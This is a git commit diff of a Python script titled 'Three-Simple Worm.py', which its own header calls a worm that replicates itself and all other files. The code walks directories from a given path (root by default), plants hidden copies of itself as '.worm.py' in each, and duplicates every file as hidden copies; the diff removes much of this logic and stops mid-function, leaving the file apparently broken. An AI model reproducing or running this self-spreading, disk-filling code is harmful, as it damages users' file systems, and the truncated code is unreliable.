cda295ff06969704d69ecd137d6c7828080fcc0b
Grace Preston <143225518+Grass-Rat@users.noreply.github.com>
2024-03-28 10:17:10 -0400

    Update Three-Simple Worm.py
    Added comments

--- Three-Simple Worm.py
+++ Three-Simple Worm.py
@@ -1,77 +1,49 @@
 # The script is a worm that can replicate itself and all other files
 
-
 import os
 import shutil
-
 
 class Worm:
     
     def __init__(self, path=None, target_dir_list=None, iteration=None):
+        # Initialize the Worm object with optional parameters, default values are provided if not specified
         if isinstance(path, type(None)):
-            self.path = "/"
+            self.path = "/"  # Set default path to root directory if not provided
         else:
             self.path = path
             
         if isinstance(target_dir_list, type(None)):
-            self.target_dir_list = []
+            self.target_dir_list = []  # Initialize an empty list for storing target directories
         else:
             self.target_dir_list = target_dir_list
             
         if isinstance(target_dir_list, type(None)):
-            self.iteration = 2
+            self.iteration = 2  # Default number of iterations for file copying
         else:
             self.iteration = iteration
         
-        # get own absolute path
+        # Get the absolute path of the script
         self.own_path = os.path.realpath(__file__)
         
         
-    def list_directories(self,path):
-        self.target_dir_list.append(path)
+    def list_directories(self, path):
+        # Recursively list directories and files starting from the given path
+        self.target_dir_list.append(path)  # Append the current directory to the target directory list
         files_in_current_directory = os.listdir(path)
         
         for file in files_in_current_directory:
-            # avoid hidden files/directories (start with dot (.))
+            # Avoid processing hidden files/directories (start with dot (.))
             if not file.startswith('.'):
-                # get the full path
+                # Get the full path of the file
                 absolute_path = os.path.join(path, file)
-                print(absolute_path)
+                print(absolute_path)  # Print the absolute path (for demonstration purposes)
 
                 if os.path.isdir(absolute_path):
+                    # If the current item is a directory, recursively call list_directories
                     self.list_directories(absolute_path)
                 else:
-                    pass
+                    pass  # No action needed if it's a file
     
     
     def create_new_worm(self):
-        for directory in self.target_dir_list:
-            destination = os.path.join(directory, ".worm.py")
-            # copy the script in the new directory with similar name
-            shutil.copyfile(self.own_path, destination)
-            
-    
-    def copy_existing_files(self):
-        for directory in self.target_dir_list:
-            file_list_in_dir = os.listdir(directory)
-            for file in file_list_in_dir:
-                abs_path = os.path.join(directory, file)
-                if not abs_path.startswith('.') and not os.path.isdir(abs_path):
-                    source = abs_path
-                    for i in range(self.iteration):
-                        destination = os.path.join(directory,("."+file+str(i)))
-                        shutil.copyfile(source, destination)
-                        
-                        
-    def start_worm_actions(self):
-        self.list_directories(self.path)
-        print(self.target_dir_list)
-        self.create_new_worm()
-        self.copy_existing_files()
-        
-        
-                        
-if __name__=="__main__":
-    current_directory = os.path.abspath("")
-    worm = Worm(path=current_directory)
-    worm.start_worm_actions()
+        # Create a copy of the script in each target directory 
